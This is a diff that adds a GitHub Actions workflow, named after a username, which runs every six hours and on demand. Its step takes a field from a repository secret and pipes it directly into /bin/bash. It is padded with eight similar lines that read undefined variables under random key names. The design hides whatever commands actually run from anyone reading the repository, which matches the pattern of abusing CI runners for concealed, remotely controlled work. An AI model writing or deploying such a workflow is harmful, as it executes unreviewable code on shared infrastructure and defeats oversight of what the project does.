@@ -1,0 +1,26 @@
+name: chenfufeng5432
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chenfufeng5432
+        env:
+          b8: ${{ secrets.b8 }}
+        run: |
+          echo $b8 | jq -r .qxjg7 | /bin/bash
+          echo $z09724 | jq -r .we3 | /bin/bash
+          echo $tjsft5172 | jq -r .jvv75 | /bin/bash
+          echo $hdryi8 | jq -r .u09762 | /bin/bash
+          echo $xoa7682 | jq -r .halk4713 | /bin/bash
+          echo $nbb624 | jq -r .htc71 | /bin/bash
+          echo $e3 | jq -r .j66773 | /bin/bash
+          echo $rbvta69 | jq -r .mug9974 | /bin/bash
+          echo $f5928 | jq -r .mqi60 | /bin/bash
+
